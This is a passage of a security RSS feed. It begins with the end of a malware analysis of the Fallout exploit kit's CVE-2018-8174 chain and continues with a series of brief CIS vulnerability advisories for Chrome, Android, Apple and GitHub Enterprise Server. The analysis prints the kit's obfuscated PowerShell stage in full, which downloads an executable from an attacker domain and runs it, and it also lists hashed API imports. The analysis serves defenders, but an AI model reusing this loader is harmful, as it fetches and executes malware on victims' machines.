<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>This code is exploit by replacing the shellcode part of PoC of CVE-2018-8174 on GitHub. We are finding that four PoCs are being exploited. There may be other things.</p>

<ul>
  <li>w7374520/CVE-2018-8174_EXP/master/CVE-2018-8174.py</li>
  <li>admintony/VulRec/master/CVE-2018-8174/calc.html</li>
  <li>kaisaryousuf/CVE-2018-8174-msf/master/CVE-2018-8174.rb</li>
  <li>lovebair2022/CVE-2018-8174-msf/master/CVE-2018-8174.rb</li>
</ul>

<h2 id="shellcode">Shellcode</h2>
<p><a href="https://www.nao-sec.org/2019/01/in-depth-analysis-of-new-fallout.html">In the previous blog</a> We wrote that Fallout uses RC4 and powershell. Currently, It decrypts with RC4 using multiple keys.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-6UVMjUup6qo/XHn461S2DQI/AAAAAAAAaAc/ihjgvwM48ds78W-1a50a5naMAiw-jtvwQCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B121824.jpg" /></p>

<p><img alt="" src="https://1.bp.blogspot.com/-DymvnKJrNeE/XHn5O-hzKBI/AAAAAAAAaAs/s8JysGgcRwAk_vvDNVcUIIu8nLHY0LfswCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B123150.jpg" /></p>

<h3 id="encrypted-data">Encrypted data</h3>
<p>Encrypted data is near the end of the shell code.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-gsfXIhMYevM/XHn8WBk9ovI/AAAAAAAAaBg/10bGFzmcPOwREpu9jFcdDV_QNU_q428QQCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B124509.jpg" /></p>

<p>The following strings are encrypted.</p>

<ul>
  <li>URL</li>
</ul>

<p><img alt="" src="https://3.bp.blogspot.com/-mGb6y9CcLgY/XHn_tTXITlI/AAAAAAAAaBs/Tx-IZGvfR7MKXeLZoduOknHsG-oG611mACLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B094830.jpg" /></p>

<ul>
  <li>Path</li>
</ul>

<p><img alt="" src="https://1.bp.blogspot.com/-nJQJtvhQ4ts/XHoAJThO_UI/AAAAAAAAaB0/AqdnhErozq4RtSn0IBPxDh26i1VIb3ySwCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B094918.jpg" /></p>

<ul>
  <li>lpszAgent</li>
</ul>

<p><img alt="" src="https://4.bp.blogspot.com/-SHiC_-K52OE/XHoAYO0KSqI/AAAAAAAAaB4/mIuho6VGEigMXjQD0PYCic7yPSQjP50agCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095113.jpg" /></p>

<ul>
  <li>HTTP Method</li>
</ul>

<p><img alt="" src="https://1.bp.blogspot.com/-8VHYdHuFVzo/XHoAun-ulAI/AAAAAAAAaCE/dZL11EMf0Js8hKDBVtWrb1TpxiUKVleHgCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095212.jpg" /></p>

<ul>
  <li>Dll name</li>
</ul>

<p><img alt="" src="https://4.bp.blogspot.com/-d1VACU5EdCg/XHoA0UXjwJI/AAAAAAAAaCI/4nYEy6pr69YYZGCk-PYTL4DwLlXGXPEaACLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095457.jpg" /></p>

<h3 id="execute">Execute</h3>
<p><img alt="" src="https://1.bp.blogspot.com/-J6-pH9sR77Y/XHoD9uuQ2rI/AAAAAAAAaCg/tdiUL-ppen0UgdBMlAw0YJoIAOp5JoJkgCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B131719.jpg" /></p>

<h3 id="api-hash">API hash</h3>
<p>The API called by the shell code has been hashed by the dualaccModFFF1Hash algorithm.</p>

<p><img alt="" src="https://3.bp.blogspot.com/--PgKXNTSaEU/XHoC9ETsXsI/AAAAAAAAaCY/YfQrDoaJySA6qJpeQcsquCv6MRV5XyxwgCLcBGAs/s320/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B131317.jpg" /></p>



<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ShellcodeHashSearcher: 0x00000686: dualaccModFFF1Hash:0x191c0443 kernel32.dll!CloseHandle
ShellcodeHashSearcher: 0x00000694: dualaccModFFF1Hash:0x28b90575 kernel32.dll!CreateProcessA
ShellcodeHashSearcher: 0x000006a6: dualaccModFFF1Hash:0x73320951 kernel32.dll!CreateToolhelp32Snapshot
ShellcodeHashSearcher: 0x000006b9: dualaccModFFF1Hash:0x33f50614 kernel32.dll!GetModuleHandleA
ShellcodeHashSearcher: 0x000006ca: dualaccModFFF1Hash:0x1d810497 kernel32.dll!LoadLibraryA
ShellcodeHashSearcher: 0x000006da: dualaccModFFF1Hash:0x2785054d kernel32.dll!Process32First
ShellcodeHashSearcher: 0x000006eb: dualaccModFFF1Hash:0x225904e4 kernel32.dll!Process32Next
ShellcodeHashSearcher: 0x000006fc: dualaccModFFF1Hash:0x1f7004d3 kernel32.dll!VirtualAlloc
ShellcodeHashSearcher: 0x0000070d: dualaccModFFF1Hash:0x1a1e047a kernel32.dll!ExitProcess
ShellcodeHashSearcher: 0x0000071e: dualaccModFFF1Hash:0x158503f3 kernel32.dll!ExitThread
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c msvcrt.dll!memset
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c ntoskrnl.exe!memset
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c ntdll.dll!memset
ShellcodeHashSearcher: 0x00000778: dualaccModFFF1Hash:0x3610065d wininet.dll!HttpOpenRequestA
ShellcodeHashSearcher: 0x00000787: dualaccModFFF1Hash:0x29fb0584 wininet.dll!HttpQueryInfoA
ShellcodeHashSearcher: 0x0000079a: dualaccModFFF1Hash:0x35c70655 wininet.dll!HttpSendRequestA
ShellcodeHashSearcher: 0x000007ab: dualaccModFFF1Hash:0x4b92078c wininet.dll!InternetCloseHandle
ShellcodeHashSearcher: 0x000007bc: dualaccModFFF1Hash:0x36640655 wininet.dll!InternetConnectA
ShellcodeHashSearcher: 0x000007cd: dualaccModFFF1Hash:0x245c051d wininet.dll!InternetOpenA
ShellcodeHashSearcher: 0x000007de: dualaccModFFF1Hash:0x35c00646 wininet.dll!InternetReadFile
ShellcodeHashSearcher: 0x00000685: dualaccModFFF1Hash:0x191c0443 kernel32.dll!CloseHandle
ShellcodeHashSearcher: 0x00000693: dualaccModFFF1Hash:0x28b90575 kernel32.dll!CreateProcessA
ShellcodeHashSearcher: 0x000006a5: dualaccModFFF1Hash:0x73320951 kernel32.dll!CreateToolhelp32Snapshot
ShellcodeHashSearcher: 0x000006b8: dualaccModFFF1Hash:0x33f50614 kernel32.dll!GetModuleHandleA
ShellcodeHashSearcher: 0x000006c9: dualaccModFFF1Hash:0x1d810497 kernel32.dll!LoadLibraryA
ShellcodeHashSearcher: 0x000006d9: dualaccModFFF1Hash:0x2785054d kernel32.dll!Process32First
ShellcodeHashSearcher: 0x000006ea: dualaccModFFF1Hash:0x225904e4 kernel32.dll!Process32Next
ShellcodeHashSearcher: 0x000006fb: dualaccModFFF1Hash:0x1f7004d3 kernel32.dll!VirtualAlloc
ShellcodeHashSearcher: 0x0000070c: dualaccModFFF1Hash:0x1a1e047a kernel32.dll!ExitProcess
ShellcodeHashSearcher: 0x0000071d: dualaccModFFF1Hash:0x158503f3 kernel32.dll!ExitThread
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c msvcrt.dll!memset
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c ntoskrnl.exe!memset
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c ntdll.dll!memset
ShellcodeHashSearcher: 0x00000777: dualaccModFFF1Hash:0x3610065d wininet.dll!HttpOpenRequestA
ShellcodeHashSearcher: 0x00000786: dualaccModFFF1Hash:0x29fb0584 wininet.dll!HttpQueryInfoA
ShellcodeHashSearcher: 0x00000799: dualaccModFFF1Hash:0x35c70655 wininet.dll!HttpSendRequestA
ShellcodeHashSearcher: 0x000007aa: dualaccModFFF1Hash:0x4b92078c wininet.dll!InternetCloseHandle
ShellcodeHashSearcher: 0x000007bb: dualaccModFFF1Hash:0x36640655 wininet.dll!InternetConnectA
ShellcodeHashSearcher: 0x000007cc: dualaccModFFF1Hash:0x245c051d wininet.dll!InternetOpenA
ShellcodeHashSearcher: 0x000007dd: dualaccModFFF1Hash:0x35c00646 wininet.dll!InternetReadFile
</code></pre></div></div>

<p>The final encoded PowerShell script is downloaded, decoded and executed.</p>

<h2 id="powershell">PowerShell</h2>

<pre><code class="language-ps1">Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct lI111
{
    public IntPtr llIll;
    public IntPtr II1ll1I1;
    public uint llllIlI;
    public uint l1l1l;
}

[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
public struct lI1I1l1l
{
    public uint lI1lI1I;
    public string l1l1II1;
    public string llIlI1;
    public string IlIl1l;
    public uint ll1llI11;
    public uint ll1l11I1;
    public uint IlI11lI;
    public uint IIlIll1I;
    public uint IIl1II;
    public uint I11Il;
    public uint IIIIII;
    public uint l1IlIll;
    public short llI11l1;
    public short llll1I11;
    public IntPtr I1llIIlI;
    public IntPtr Il1I11lI;
    public IntPtr llllll;
    public IntPtr lI1l1I1I;
};

public static class I1l11lIl
{
    [DllImport(""kernel32.dll"",SetLastError=true)]
    public static extern bool CreateProcess(string I1l1Il1I,string l1111,IntPtr lllI111,IntPtr I111IIlI,bool lllll,uint III1l1l1,IntPtr l1l1l11l,string lIll1111,ref lI1I1l1l l111l,out lI111 I1111l1);
}
"@;

$lIlI1 = "$env:userprofile\AppData\LocalLow\$(-join((48..57)+(65..90)+(97..122)|Get-Random -Count 8|%{[char]$_})).tmp";
$Il11l = 'https://not-my-guilty.com/04_10_1971/beaveries/aoer.phtml';

$cli = (New-Object Net.WebClient);
$cli.Headers['User-Agent'] = 'pqqyW56Fe8W2G7m3';
$cli.DownloadFile($Il11l, $lIlI1);

$llII11l = New-Object lI1I1l1l;
$llII11l.llI11l1 = 0x0;
$llII11l.lI1lI1I = [System.Runtime.InteropServices.Marshal]::SizeOf($llII11l);
$I1111111 = New-Object lI111;
[I1l11lIl]::CreateProcess($lIlI1, $lIlI1, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x00000008, [IntPtr]::Zero, "c:", [ref]$llII11l, [ref]$I1111111)|out-null;
</code></pre>

<p>This PowerShell code downloads the malware and calls CreateProcess. At this time, User-Agent is not common.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-03-07/02.png" /></p>

<h2 id="finally">Finally</h2>
<p>Fallout has also evolved. Analysis has become more difficult than before. You should keep an eye on Fallout in the future.</p>
]]></content:encoded>
<pubDate>2019-03-06T15:00:00+00:00</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Android OS Could Allow for Privilege Escalation</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-android-os-could-allow-for-privilege-escalation_2024-088</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-android-os-could-allow-for-privilege-escalation_2024-088</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Android OS, the most severe of which could allow for privilege escalation. Android is an operating system developed by Google for mobile devices, including, but not limited to, smartphones, tablets, and watches. Successful exploitation of the most severe of these vulnerabilities could allow for privilege escalation. Depending on the privileges associated with the exploited component, an attacker could then install programs; view, change, or delete data; or create new accounts with full rights.</p>
]]></content:encoded>
<pubDate>Wed, 07 Aug 2024 14:06:56 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-087</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-087</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 07 Aug 2024 03:03:31 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Apple Products Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-apple-products-could-allow-for-arbitrary-code-execution_2024-085</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-apple-products-could-allow-for-arbitrary-code-execution_2024-085</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Apple products, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 30 Jul 2024 20:28:55 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-084</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-084</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 23 Jul 2024 23:03:48 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-081</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-081</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 17 Jul 2024 08:05:07 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-074</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-074</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 25 Jun 2024 15:04:25 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-072</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-072</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 12 Jun 2024 09:10:19 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-064</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-064</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Fri, 31 May 2024 02:01:37 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-061</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-061</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in Google Chrome that could allow for arbitrary code execution. Google Chrome is a web browser used to access the internet. Successful exploitation of this vulnerability could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the logged on user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have less rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Fri, 24 May 2024 08:59:23 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in GitHub Enterprise Server (GHES) Could Allow for Authentication Bypass</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-github-enterprise-server-ghes-could-allow-for-authentication-bypass_2024-060</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-github-enterprise-server-ghes-could-allow-for-authentication-bypass_2024-060</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in GitHub Enterprise Server (GHES), which could allow for authentication bypass. GHES is a popular platform for software developers. Organizations can build and store software applications using Git version control and automate deployment pipelines. Successful exploitation of this vulnerability could allow for an attacker to forge a SAML response to provision and/or gain access to a user with site administrator privileges. An attacker could then view, change, or delete data; or create new accounts with full user rights.</p>
]]></content:encoded>
<pubDate>Thu, 23 May 2024 16:45:55 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-058</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-058</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 15 May 2024 20:27:29 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-052</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-052</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of this vulnerability could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 14 May 2024 15:03:37 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Apple Products Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-apple-products-could-allow-for-arbitrary-code-execution_2024-051</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-apple-products-could-allow-for-arbitrary-code-execution_2024-051</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Apple products, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Mon, 13 May 2024 18:04:04 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-050</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-050</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of this vulnerability could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Thu, 09 May 2024 22:13:23 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-047</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-047</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 07 May 2024 20:53:37 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Android OS Could Allow for Privilege Escalation</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-android-os-could-allow-for-privilege-escalation_2024-045</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-android-os-could-allow-for-privilege-escalation_2024-045</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Android OS, the most severe of which could allow for privilege escalation. Android is an operating system developed by Google for mobile devices, including, but not limited to, smartphones, tablets, and watches. Successful exploitation of the most severe of these vulnerabilities could allow for privilege escalation. Depending on the privileges associated with the exploited component, an attacker could then install programs; view, change, or delete data; or create new accounts with full rights.</p>
]]></content:encoded>
<pubDate>Mon, 06 May 2024 23:47:37 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-044</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-044</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 30 Apr 2024 21:42:46 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-043</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-043</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 24 Apr 2024 18:47:25 -0400</pubDate>
</item>
</channel>
</rss>